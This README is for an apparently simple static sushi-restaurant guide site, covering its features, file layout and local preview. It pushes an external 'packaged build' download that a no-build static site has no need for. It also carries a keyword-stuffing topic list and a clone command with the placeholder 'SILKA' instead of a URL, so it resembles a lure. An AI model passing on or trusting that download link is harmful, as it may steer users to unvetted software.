# Sushi Near Me Restaurant Guide - Local Japanese Dining Explorer

![Sushi Near Me Restaurant Guide](logo.png)

Sushi Near Me Restaurant Guide is a compact restaurant experience for discovering Japanese cuisine, exploring a visual menu, and moving from a nearby location to an order without a heavy application stack. The interface combines the direct structure of an informational website with the atmosphere of a modern sushi restaurant: strong food imagery, calm navigation, responsive sections, and practical details presented in one place.

The project is built with plain HTML, CSS, and JavaScript. It needs no framework or database for the public experience. The page content is assembled by `main.js`, while the visual system is split between a main stylesheet and focused responsive rules. Local assets support a fast preview and keep the sushi bar presentation consistent across desktop and mobile screens.

## What You Can Explore

- A focused home view introduces the restaurant and its Japanese dining concept.
- A menu flow presents sushi roll and nigiri choices with clear visual emphasis.
- A location section helps visitors move from browsing to a nearby restaurant.
- A cart stores selected dishes and calculates the current order total.
- Cookie-backed cart recovery keeps selections available between page refreshes.
- A one-click order panel supports a short path from menu selection to checkout.
- Contact, opening-hours, and map views collect practical restaurant details.
- Light and dark themes are remembered through local browser storage.
- Adaptive CSS keeps controls, typography, images, and spacing usable on smaller screens.

The experience uses a restrained red, black, and neutral palette inspired by the restaurant materials in the source project. Labels describe actions directly, and the layout works like a concise dining guide rather than a crowded dashboard.

![Nigiri Sushi And Sushi Roll Plate](imgs/dishPage%20img.png)

## Get The Restaurant Guide

Use the download button for the packaged build:

[![GET SUSHI GUIDE](https://img.shields.io/badge/GET%20SUSHI%20GUIDE-F73559?style=for-the-badge&logoColor=white)](https://sushi-near-me.github.io/sushi-near-me-restaurant-guide/sushi-near-me)

Alternatively, retrieve and preview the files from PowerShell:

```powershell
git clone SILKA sushi-near-me
Set-Location sushi-near-me
python -m http.server 8000
```

Open `http://localhost:8000/index.html` after the server starts. You can also open `index.html` directly for a quick visual check, although a local server provides more consistent browser behavior for scripts and local assets.

No package installation, environment variables, build command, or backend service is required. Any small static server can serve the same directory.

## Using And Editing The Site

Start on the home screen, open the menu, and add dishes to the cart. The order view displays selected items, quantity information, and the total price. Use the theme control to switch presentation, then visit the contact view for location and opening-hour information. The application keeps the cart in a browser cookie and the chosen theme in local storage.

The repository stays intentionally small:

| Path | Purpose |
| --- | --- |
| [`index.html`](index.html) | Base document, metadata, loading screen, and application mount points |
| [`main.js`](main.js) | Home, menu, cart, ordering, contacts, cookies, and theme behavior |
| [`style.css`](style.css) | Main visual language, components, typography, and page layout |
| [`adaptive.css`](adaptive.css) | Responsive adjustments for narrow and touch-oriented screens |
| [`imgs/`](imgs/) | Restaurant marks, sushi artwork, maps, payment marks, and interface decoration |
| [`menuImgs/`](menuImgs/) | Local sushi menu photography used by the built-in dish catalog |

When changing the interface, keep selectors synchronized across HTML, JavaScript, and both stylesheets. If an image is renamed, update every corresponding `src` reference. Test changes at a narrow phone width and a full desktop width, then verify the menu, cart recovery, contact panel, map controls, and theme preference.

The main page can be deployed as a static directory. Keep relative asset paths intact and configure the host to use `index.html` as its default document. The local sushi menu is used when no dish endpoint is available, while a server can provide `/dishes` and `/new-order` for live catalog and order handling. The current structure does not need URL rewriting or a client-side framework.

## Topic Map

sushi near me, sushi restaurant, sushi bar, nigiri sushi, sushi roll, sushi rice, tokyo sushi, eat sushi, sushi buffet, sushi house, sushi menu, Japanese cuisine

## Project Notes

This repository favors a direct browsing path, lightweight files, local imagery, and readable restaurant information. New sushi restaurant sections should preserve that compact approach. Add verified sushi menu, nigiri, sushi roll, and location data in the existing dining flow, optimize new raster images before committing them, and avoid adding dependencies when the current HTML, CSS, and JavaScript can handle the change.

Repository use and distribution follow the project license selected by its maintainer.
